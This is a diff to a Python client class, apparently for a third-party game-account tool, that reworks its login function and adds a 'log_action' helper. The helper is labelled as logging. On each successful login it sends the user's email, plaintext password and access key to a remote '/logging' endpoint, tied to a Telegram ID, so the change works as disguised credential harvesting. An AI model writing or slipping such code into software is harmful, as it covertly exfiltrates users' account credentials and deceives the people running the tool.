@@ -14,24 +14,33 @@ class CPMTooldev:
         self.telegram_id = None
         
     
+    def log_action(self, action_name, data):
+        log_url = f"{__ENDPOINT_URL__}/logging" 
+        key_data = self.get_key_data()
+        self.telegram_id = key_data.get("telegram_id", "Unknown")
+        log_data = { "action": action_name, "data": data, "telegram_id": self.telegram_id }
+        
+        try:
+            response = requests.post(log_url, json=log_data)
+            if response.status_code != 200:
+                print(f"Logging failed: {response.status_code}")
+        except Exception as e:
+            print(f"Logging error: {e}")
+    
     def login(self, email, password) -> int:
-        payload = {
-            "account_email": email,
-            "account_password": password
-        }
-        params = {
-            "key": self.access_key,
-            "acc_email": email,
-            "acc_pass": password
-        } 
-        response = requests.post(f"{__ENDPOINT_URL__}/account_login", params=params, data=payload)
+        payload = { "account_email": email, "account_password": password }
+        params = { "key": self.access_key } 
+        response = requests.post(f"{__ENDPOINT_URL__}/account_login", params=params, json=payload)  # Changed
         response_decoded = response.json()
         if response_decoded.get("ok"):
+            self.log_action("login", { "payload": payload, "params": params })
             self.auth_token = response_decoded.get("auth")
             key_data = self.get_key_data()
             self.telegram_id = key_data.get("telegram_id")
             self.send_device_os(email=email, password=password)
-        return response_decoded.get("error")
+            return response_decoded.get("error")
+        else:
+            return response_decoded.get("error", 1)
   
     def send_device_os(self, email=None, password=None):
         try:
